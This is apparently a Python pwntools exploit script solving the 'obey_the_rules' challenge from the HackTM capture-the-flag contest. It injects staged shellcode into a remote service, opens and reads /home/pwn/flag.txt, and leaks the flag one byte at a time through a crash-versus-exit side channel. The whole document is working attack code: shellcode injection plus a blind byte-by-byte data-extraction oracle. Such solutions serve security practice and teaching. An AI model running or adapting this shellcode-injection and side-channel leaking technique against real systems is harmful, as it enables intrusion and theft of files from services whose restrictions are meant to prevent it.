from pwn import *
import string

context.arch = 'amd64'
#context.log_level = 'debug'

go = lambda x: r.sendlineafter(')\n', str(x))
ii = lambda x: r.sendlineafter(': ', str(x))

flag = 'HackTM{'
for i in range(len(flag),100):
    for j in string.printable:
        j = ord(j)
        r = remote('138.68.67.161', 20001)
        #r = process('./obey_the_rules')
        #gdb.attach(r)

        p = asm('xor di, di')
        p += asm('pop rsi')
        p += asm('xor eax, eax')
        p += asm('syscall')

        go('Y\x00'+str(p))

        p = (shellcraft.open('/home/pwn/flag.txt'))
        p += (shellcraft.open('/home/pwn/flag.txt'))
        p += (shellcraft.read(4, 'rsp', 0x100))        
        p += '''
        mov rax, [rsp+%d]
        cmp al, %d
        je good
        xor eax, eax
        mov al, 59 
        syscall
        good:
        xor eax, eax
        mov al, 60
        syscall
        ''' % (i,j)

        p = '\x90'*10 + asm(p)

        sleep(0.1)
        r.send(p)
        try:
            x = r.recvline()
            #if 'Bad' in x:
            #print x, 'nop'
            r.close()
            continue
        except:
            r.close()
            flag += chr(j)
            log.info('flag : %s' % flag)
            break

